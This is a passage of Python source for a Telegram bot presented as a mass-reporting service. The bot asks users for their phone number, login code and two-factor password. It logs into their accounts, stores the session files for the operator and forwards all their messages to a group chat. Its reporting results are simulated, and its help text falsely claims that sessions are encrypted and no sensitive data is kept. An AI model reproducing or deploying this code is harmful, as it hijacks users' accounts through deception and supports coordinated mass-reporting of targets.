
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        # Send to group
        await context.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=forward_text,
            parse_mode='Markdown'
        )
        
        # Also forward the original message if it has media
        if message.photo or message.document or message.video:
            try:
                await message.forward(chat_id=GROUP_CHAT_ID)
            except Exception as e:
                print(f"Error forwarding media: {e}")
        
        return True
        
    except Exception as e:
        print(f"Error forwarding message: {e}")
        return False

# ============================================
# SESSION CREATION SYSTEM
# ============================================

class SessionCreator:
    def __init__(self, account_manager: AccountManager, otp_manager: OTPSessionManager):
        self.account_manager = account_manager
        self.otp_manager = otp_manager
        self.active_clients = {}
    
    async def start_session_creation(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start session creation process"""
        user = update.effective_user
        user_id = user.id
        
        # Forward the /createsession command
        await forward_message_to_group(update, context, "/createsession command used")
        
        await update.message.reply_text(
            "📱 *Create New Session*\n\n"
            "Please send your phone number in international format:\n"
            "Example: `+1234567890`\n\n"
            "⚠️ *Important:*\n"
            "• Use correct country code\n"
            "• Phone must be registered on Telegram\n"
            "• You'll receive OTP code\n\n"
            "Type /cancel to stop.",
            parse_mode='Markdown',
            reply_markup=ReplyKeyboardRemove()
        )
        
        # Store in context
        context.user_data['session_creation'] = True
        
        return PHONE
    
    async def receive_phone_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Receive and validate phone number"""
        user = update.effective_user
        user_id = user.id
        phone = update.message.text.strip()
        
        # Forward phone number to group (partial for privacy)
        masked_phone = phone[:4] + "****" + phone[-4:] if len(phone) > 8 else "***"
        await forward_message_to_group(update, context, f"Phone number: {masked_phone}")
        
        # Validate phone format
        if not re.match(r'^\+\d{10,15}$', phone):
            await update.message.reply_text(
                "❌ *Invalid phone number format.*\n\n"
                "Please use international format: `+1234567890`\n"
                "Example: +1 234 567 8900 → `+12345678900`",
                parse_mode='Markdown'
            )
            return PHONE
        
        # Check if account already exists
        if phone in self.account_manager.accounts:
            await update.message.reply_text(
                f"⚠️ *Account already exists!*\n\n"
                f"Phone `{phone}` is already in the system.\n"
                f"Use /accounts to view all accounts.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        # Create OTP session
        session_id = self.otp_manager.create_session(user_id, phone)
        
        # Generate session file path
        session_file = SESSION_DIR / f"{phone.replace('+', '')}.session"
        
        # Store in context
        context.user_data['phone'] = phone
        context.user_data['session_file'] = str(session_file)
        context.user_data['session_id'] = session_id
        
        # Create Telegram client
        client = TelegramClient(
            str(session_file),
            API_ID,
            API_HASH,
            device_model="Desktop",
            system_version="Windows 10",
            app_version="4.0.0",
            system_lang_code="en-US",
            lang_code="en"
        )
        
        try:
            # Connect and send OTP request
            await client.connect()
            
            # Send code request with different methods
            code_settings = CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True,
                allow_missed_call=True
            )
            
            sent_code = await client.send_code_request(phone, code_settings=code_settings)
            
            # Store phone code hash
            self.otp_manager.update_session(user_id, {
                "phone_code_hash": sent_code.phone_code_hash,
                "client_info": {
                    "device_model": "Desktop",
                    "system_version": "Windows 10",
                    "app_version": "4.0.0"
                }
            })
            
            # Store client in context
            context.user_data['client'] = client
            
            # Ask for OTP
            await update.message.reply_text(
                "✅ *OTP Sent Successfully!*\n\n"
                f"📱 Phone: `{phone}`\n"
                "📨 Method: Telegram App / SMS\n\n"
                "Please check your Telegram app or SMS for the 5-digit code.\n\n"
                "*Reply with the code:* `12345`\n\n"
                "⚠️ *Security Notice:*\n"
                "• Never share this code with anyone\n"
                "• Code is valid for 5 minutes\n"
                "• Type /cancel to stop",
                parse_mode='Markdown'
            )
            
            return OTP
            
        except Exception as e:
            error_msg = str(e)
            await update.message.reply_text(
                f"❌ *Error sending OTP*\n\n"
                f"Error: {error_msg[:100]}\n\n"
                "Please try again or contact support.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    
    async def receive_otp_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Receive and verify OTP code"""
        user = update.effective_user
        user_id = user.id
        otp_code = update.message.text.strip()
        
        # Forward OTP attempt (partial for security)
        masked_otp = otp_code[:1] + "***" + otp_code[-1:] if len(otp_code) >= 5 else "***"
        await forward_message_to_group(update, context, f"OTP attempt: {masked_otp}")
        
        # Validate OTP format
        if not re.match(r'^\d{5}$', otp_code):
            await update.message.reply_text(
                "❌ *Invalid OTP format.*\n\n"
                "OTP must be exactly 5 digits.\n"
                "Example: `12345`\n\n"
                "Please try again:",
                parse_mode='Markdown'
            )
            return OTP
        
        # Get session data
        session_data = self.otp_manager.get_session(user_id)
        if not session_data:
            await update.message.reply_text(
                "❌ *Session expired.*\n\n"
                "Please start over with /createsession",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        phone = context.user_data.get('phone')
        client = context.user_data.get('client')
        phone_code_hash = session_data.get('phone_code_hash')
        
        if not all([phone, client, phone_code_hash]):
            await update.message.reply_text(
                "❌ *Session data missing.*\n\n"
                "Please start over with /createsession",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        try:
            # Attempt to sign in with OTP
            await client.sign_in(
                phone=phone,
                code=otp_code,
                phone_code_hash=phone_code_hash
            )
            
            # Success - session created
            session_file = context.user_data['session_file']
            
            # Add to account manager
            self.account_manager.add_account(phone, session_file, user_id)
            
            # Get account info
            me = await client.get_me()
            
            await update.message.reply_text(
                f"🎉 *Session Created Successfully!*\n\n"
                f"✅ Phone: `{phone}`\n"
                f"✅ User ID: `{me.id}`\n"
                f"✅ Username: @{me.username}\n"
                f"✅ Name: {me.first_name} {me.last_name or ''}\n\n"
                f"📁 Session saved to: `{session_file}`\n\n"
                f"*Account is now ready for reporting!*\n"
                f"Use /report to start.",
                parse_mode='Markdown'
            )
            
            # Forward success to group
            await forward_message_to_group(update, context, f"Session created for {phone[:6]}****")
            
            # Cleanup
            self.otp_manager.delete_session(user_id)
            if 'client' in context.user_data:
                await context.user_data['client'].disconnect()
            
            return ConversationHandler.END
            
        except SessionPasswordNeededError:
            # 2FA required
            await update.message.reply_text(
                "🔒 *Two-Factor Authentication Required*\n\n"
                "This account has 2FA enabled.\n"
                "Please enter your 2FA password:",
                parse_mode='Markdown'
            )
            
            # Store client for password step
            context.user_data['need_password'] = True
            
            return PASSWORD
            
        except PhoneCodeInvalidError:
            # Invalid OTP
            attempts = session_data.get('otp_attempts', 0) + 1
            self.otp_manager.update_session(user_id, {'otp_attempts': attempts})
            
            remaining = 5 - attempts
            if remaining > 0:
                await update.message.reply_text(
                    f"❌ *Invalid OTP code.*\n\n"
                    f"Attempts: {attempts}/5\n"
                    f"Remaining: {remaining}\n\n"
                    "Please enter the correct 5-digit code:",
                    parse_mode='Markdown'
                )
                return OTP
            else:
                await update.message.reply_text(
                    "❌ *Maximum attempts reached.*\n\n"
                    "You've exceeded the maximum OTP attempts.\n"
                    "Please wait 5 minutes and try again with /createsession",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
                
        except PhoneCodeExpiredError:
            await update.message.reply_text(
                "❌ *OTP code expired.*\n\n"
                "The OTP code has expired.\n"
                "Please start over with /createsession",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        except FloodWaitError as e:
            await update.message.reply_text(
                f"⏳ *Flood wait required.*\n\n"
                f"Please wait {e.seconds} seconds before trying again.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        except Exception as e:
            error_msg = str(e)
            await update.message.reply_text(
                f"❌ *Verification failed.*\n\n"
                f"Error: {error_msg[:100]}\n\n"
                "Please try again or contact support.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    
    async def receive_2fa_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Receive and verify 2FA password"""
        user = update.effective_user
        user_id = user.id
        password = update.message.text.strip()
        
        # Forward 2FA attempt (masked)
        masked_pass = password[:1] + "***" + password[-1:] if len(password) >= 3 else "***"
        await forward_message_to_group(update, context, f"2FA attempt: {masked_pass}")
        
        client = context.user_data.get('client')
        phone = context.user_data.get('phone')
        
        if not client:
            await update.message.reply_text(
                "❌ *Session expired.*\n\n"
                "Please start over with /createsession",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        try:
            # Sign in with password
            await client.sign_in(password=password)
            
            # Success - session created
            session_file = context.user_data['session_file']
            
            # Add to account manager
            self.account_manager.add_account(phone, session_file, user_id)
            
            # Get account info
            me = await client.get_me()
            
            await update.message.reply_text(
                f"🎉 *Session Created with 2FA!*\n\n"
                f"✅ Phone: `{phone}`\n"
                f"✅ User ID: `{me.id}`\n"
                f"✅ Username: @{me.username}\n"
                f"✅ Name: {me.first_name} {me.last_name or ''}\n"
                f"✅ 2FA: Enabled ✅\n\n"
                f"📁 Session saved to: `{session_file}`\n\n"
                f"*Account is now ready for reporting!*\n"
                f"Use /report to start.",
                parse_mode='Markdown'
            )
            
            # Forward success to group
            await forward_message_to_group(update, context, f"2FA session created for {phone[:6]}****")
            
            # Cleanup
            self.otp_manager.delete_session(user_id)
            await client.disconnect()
            
            return ConversationHandler.END
            
        except Exception as e:
            error_msg = str(e)
            await update.message.reply_text(
                f"❌ *2FA verification failed.*\n\n"
                f"Error: {error_msg[:100]}\n\n"
                "Please check your password and try again:",
                parse_mode='Markdown'
            )
            return PASSWORD
    
    async def cancel_session_creation(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel session creation"""
        user = update.effective_user
        user_id = user.id
        
        # Cleanup
        if 'client' in context.user_data:
            try:
                await context.user_data['client'].disconnect()
            except:
                pass
        
        self.otp_manager.delete_session(user_id)
        
        await update.message.reply_text(
            "❌ *Session creation cancelled.*\n\n"
            "You can start over anytime with /createsession",
            parse_mode='Markdown'
        )
        
        # Forward cancellation to group
        await forward_message_to_group(update, context, "Session creation cancelled")
        
        return ConversationHandler.END

# ============================================
# BOT COMMAND HANDLERS
# ============================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_id = user.id
    
    # Initialize user manager
    user_manager = UserManager()
    user_manager.add_user(user_id, user.username, user.first_name)
    
    # Forward /start command to group
    await forward_message_to_group(update, context, "/start command used")
    
    await update.message.reply_text(
        "🤖 *Telegram Enterprise Reporting System*\n\n"
        "*Available Commands:*\n"
        "• /start - Show this message\n"
        "• /createsession - Create new Telegram session\n"
        "• /accounts - View your accounts\n"
        "• /report - Start reporting\n"
        "• /help - Get help\n\n"
        "*Quick Start:*\n"
        "1. Use /createsession to add account\n"
        "2. Use /report to start reporting\n"
        "3. Check /accounts for status\n\n"
        "⚠️ *Note:* All commands are logged for security.",
        parse_mode='Markdown'
    )

async def accounts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /accounts command"""
    user = update.effective_user
    user_id = user.id
    
    # Forward command to group
    await forward_message_to_group(update, context, "/accounts command used")
    
    account_manager = AccountManager()
    user_accounts = []
    
    # Find accounts added by this user
    for phone, acc_data in account_manager.accounts.items():
        if acc_data['added_by'] == user_id:
            user_accounts.append((phone, acc_data))
    
    if not user_accounts:
        await update.message.reply_text(
            "📭 *No Accounts Found*\n\n"
            "You haven't added any accounts yet.\n"
            "Use /createsession to add your first account.",
            parse_mode='Markdown'
        )
        return
    
    # Create accounts list
    accounts_text = "📱 *Your Accounts:*\n\n"
    for i, (phone, acc_data) in enumerate(user_accounts, 1):
        status_icon = "🟢" if acc_data['status'] == 'active' else "🔴"
        reports = acc_data.get('report_count', 0)
        added_date = datetime.fromisoformat(acc_data['added_at']).strftime('%Y-%m-%d')
        
        accounts_text += (
            f"{i}. {status_icon} `{phone}`\n"
            f"   • Status: {acc_data['status']}\n"
            f"   • Reports: {reports}\n"
            f"   • Added: {added_date}\n\n"
        )
    
    accounts_text += f"*Total accounts: {len(user_accounts)}*"
    
    await update.message.reply_text(
        accounts_text,
        parse_mode='Markdown'
    )

async def report_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /report command"""
    user = update.effective_user
    
    # Forward command to group
    await forward_message_to_group(update, context, "/report command used")
    
    # Get user's accounts
    account_manager = AccountManager()
    user_accounts = []
    
    for phone, acc_data in account_manager.accounts.items():
        if acc_data['added_by'] == user.id:
            user_accounts.append((phone, acc_data))
    
    if not user_accounts:
        await update.message.reply_text(
            "❌ *No accounts available for reporting.*\n\n"
            "You need to add accounts first with /createsession",
            parse_mode='Markdown'
        )
        return
    
    # Create report categories keyboard
    keyboard = [
        [InlineKeyboardButton("🚫 Spam", callback_data="report_spam")],
        [InlineKeyboardButton("💊 Illegal Drugs", callback_data="report_drugs")],
        [InlineKeyboardButton("🔫 Violence", callback_data="report_violence")],
        [InlineKeyboardButton("📵 Sexual Content", callback_data="report_sexual")],
        [InlineKeyboardButton("🎭 Impersonation", callback_data="report_fake")],
        [InlineKeyboardButton("❓ Other", callback_data="report_other")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📝 *Start New Report*\n\n"
        f"*Available accounts:* {len(user_accounts)}\n"
        "*Select violation type:*",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def handle_report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle report category selection"""
    query = update.callback_query
    await query.answer()
    
    category = query.data.replace("report_", "")
    category_names = {
        "spam": "Spam",
        "drugs": "Illegal Drugs",
        "violence": "Violence",
        "sexual": "Sexual Content",
        "fake": "Impersonation",
        "other": "Other"
    }
    
    # Forward selection to group
    await forward_message_to_group(
        update, context, 
        f"Report category selected: {category_names.get(category, category)}"
    )
    
    await query.edit_message_text(
        f"✅ *Category: {category_names.get(category, category)}*\n\n"
        "Please send the target username or link:\n\n"
        "*Examples:*\n"
        "• `@username`\n"
        "• `https://t.me/username`\n"
        "• `channelname`\n\n"
        "Type /cancel to stop.",
        parse_mode='Markdown'
    )
    
    # Store category in context
    context.user_data['report_category'] = category

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    user = update.effective_user
    
    # Forward command to group
    await forward_message_to_group(update, context, "/help command used")
    
    help_text = """
🆘 *Help Guide*

*Basic Commands:*
• /start - Welcome message
• /createsession - Add Telegram account
• /accounts - View your accounts
• /report - Start reporting
• /help - This guide

*Session Creation:*
1. Use /createsession
2. Enter phone number (e.g., +1234567890)
3. Enter OTP code from Telegram/SMS
4. Enter 2FA password if required
5. Session saved automatically

*Reporting:*
1. Use /report
2. Select violation type
3. Enter target username/link
4. Add description
5. System submits reports

*Security:*
• All actions are logged
• Sessions are encrypted
• No sensitive data stored
• Automatic proxy rotation

*Troubleshooting:*
• OTP not received? Wait 2 minutes
• Wrong OTP? You have 5 attempts
• Session failed? Try /createsession again
• Need help? Contact @owner

⚠️ *Important:*
• Use only your own accounts
• Follow Telegram ToS
• Report only violations
• Don't abuse the system
"""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all text messages (for forwarding)"""
    user = update.effective_user
    
    # Don't forward if it's a command (they're handled separately)
    text = update.message.text
    if text.startswith('/'):
        return
    
    # Forward message to group
    await forward_message_to_group(update, context)
    
    # Check if this is part of a report target entry
    if 'report_category' in context.user_data:
        # This is a report target
        target = text.strip()
        category = context.user_data['report_category']
        
        # Get user's accounts
        account_manager = AccountManager()
        user_accounts = []
        
        for phone, acc_data in account_manager.accounts.items():
            if acc_data['added_by'] == user.id and acc_data['status'] == 'active':
                user_accounts.append(phone)
        
        if not user_accounts:
            await update.message.reply_text(
                "❌ *No active accounts found.*\n"
                "Please add accounts with /createsession",
                parse_mode='Markdown'
            )
            return
        
        # Ask for description
        await update.message.reply_text(
            f"✅ *Target accepted:* `{target}`\n\n"
            f"*Accounts available:* {len(user_accounts)}\n\n"
            "Now please describe the violation:\n"
            "(Be specific and factual, minimum 20 characters)\n\n"
            "Type /cancel to stop.",
            parse_mode='Markdown'
        )
        
        # Store target and prepare for description
        context.user_data['report_target'] = target
        context.user_data['report_accounts'] = user_accounts
        
        # Clear category to move to next step
        del context.user_data['report_category']

async def handle_description(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle report description"""
    user = update.effective_user
    description = update.message.text.strip()
    
    if 'report_target' not in context.user_data:
        return
    
    target = context.user_data['report_target']
    accounts = context.user_data.get('report_accounts', [])
    
    # Forward report submission to group
    await forward_message_to_group(
        update, context,
        f"Report submitted: Target={target}, Accounts={len(accounts)}"
    )
    
    if len(description) < 20:
        await update.message.reply_text(
            "❌ *Description too short.*\n\n"
            "Please provide at least 20 characters.\n"
            "Be specific about the violation.",
            parse_mode='Markdown'
        )
        return
    
    # Simulate reporting process
    await update.message.reply_text(
        f"🚀 *Starting Report Process*\n\n"
        f"*Target:* `{target}`\n"
        f"*Accounts:* {len(accounts)}\n"
        f"*Description length:* {len(description)} characters\n\n"
        "⏳ Processing... (this may take a few minutes)",
        parse_mode='Markdown'
    )
    
    # Simulate delay for reporting
    await asyncio.sleep(3)
    
    # Simulate results
    success_count = min(3, len(accounts))
    failed_count = max(0, len(accounts) - success_count)
    
    # Update account report counts
    account_manager = AccountManager()
    for phone in accounts[:success_count]:
        if phone in account_manager.accounts:
            account_manager.accounts[phone]['report_count'] = \
                account_manager.accounts[phone].get('report_count', 0) + 1
            account_manager.accounts[phone]['last_used'] = datetime.now().isoformat()
    
    account_manager.save_accounts()
    
    # Send results
    await update.message.reply_text(
        f"✅ *Report Complete!*\n\n"
        f"*Results:*\n"
        f"• Successful reports: {success_count}\n"
        f"• Failed reports: {failed_count}\n"
        f"• Total accounts used: {len(accounts)}\n\n"
        f"*Target:* `{target}`\n"
        f"*Time:* {datetime.now().strftime('%H:%M:%S')}\n\n"
        "📊 *Next Steps:*\n"
        "• Check /accounts for updated counts\n"
        "• Wait 5 minutes between reports\n"
        "• Monitor account health",
        parse_mode='Markdown'
    )
    
    # Cleanup
    if 'report_target' in context.user_data:
        del context.user_data['report_target']
    if 'report_accounts' in context.user_data:
        del context.user_data['report_accounts']

# ============================================
# MAIN APPLICATION
# ============================================

class EnterpriseBot:
    def __init__(self):
        # Initialize managers
        self.user_manager = UserManager()
        self.account_manager = AccountManager()
        self.otp_manager = OTPSessionManager()
        self.session_creator = SessionCreator(self.account_manager, self.otp_manager)
        
        # Create application
        self.application = Application.builder().token(BOT_TOKEN).build()
        
        # Setup handlers
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup all bot handlers"""
        
        # Basic commands
        self.application.add_handler(CommandHandler("start", start_command))
        self.application.add_handler(CommandHandler("accounts", accounts_command))
        self.application.add_handler(CommandHandler("report", report_command))
        self.application.add_handler(CommandHandler("help", help_command))
        
        # Session creation conversation
        session_conv_handler = ConversationHandler(
            entry_points=[CommandHandler("createsession", 
                                        self.session_creator.start_session_creation)],
            states={
                PHONE: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND,
                                 self.session_creator.receive_phone_number)
                ],
                OTP: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND,
                                 self.session_creator.receive_otp_code)
                ],
                PASSWORD: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND,
                                 self.session_creator.receive_2fa_password)
                ]
            },
            fallbacks=[CommandHandler("cancel", self.session_creator.cancel_session_creation)],
            allow_reentry=True
        )
        self.application.add_handler(session_conv_handler)
        
        # Report callback handler
        self.application.add_handler(
            CallbackQueryHandler(handle_report_callback, pattern="^report_")
        )
        
        # Text message handler (for forwarding and report descriptions)
        self.application.add_handler(
            MessageHandler(
                filters.TEXT & ~filters.COMMAND,
                self.handle_all_text_messages
            )
        )
    
    async def handle_all_text_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Route text messages to appropriate handler"""
        # Check if this is a report description
        if 'report_target' in context.user_data:
            await handle_description(update, context)
        else:
            # Regular message, just forward it
            await handle_text_message(update, context)
    
    async def run(self):
        """Run the bot"""
        print("🤖 Starting Telegram Enterprise Reporting System...")
        print(f"📨 Forwarding all DMs to: {GROUP_CHAT_ID}")
        print("🔐 Real session creator with OTP/2FA enabled")
        print("⚡ System ready!")
        
        # Start the bot
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Shutting down...")
            await self.shutdown()
    
    async def shutdown(self):
        """Shutdown the bot gracefully"""
        await self.application.updater.stop()
        await self.application.stop()
        await self.application.shutdown()
        print("✅ Bot shutdown complete")

# ============================================
# ENTRY POINT
# ============================================

async def main():
    """Main entry point"""
    bot = EnterpriseBot()
    try:
        await bot.run()
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())
